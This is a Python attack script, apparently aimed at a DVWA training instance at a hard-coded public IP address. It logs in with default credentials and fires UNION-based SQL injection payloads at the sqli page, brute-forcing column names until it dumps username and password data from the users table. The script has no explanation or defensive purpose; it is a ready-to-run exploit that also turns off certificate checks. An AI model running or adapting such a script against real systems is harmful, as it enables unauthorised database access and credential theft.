
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Brute-forcing possible column names in users table...\n")

# Common column names for user tables
column_names = [
    ("user", "password"),
    ("login", "pwd"),
    ("login", "password"),
    ("name", "pwd"),
    ("username", "pwd"),
    ("account", "pass"),
    ("login_name", "login_password"),
]

for col1, col2 in column_names:
    payload_str = f"-1' UNION SELECT {col1}, {col2} FROM users #"
    print(f"[*] Trying: {col1}, {col2}")
    response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    # Extract the pre section
    pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    if pre_match:
        result_text = pre_match.group(1)
        if "Unknown column" not in result_text and "error" not in result_text.lower():
            print(f"    [+] SUCCESS! Result:\n{result_text[:600]}\n")
            break
        else:
            print(f"    [-] {result_text[:80]}")

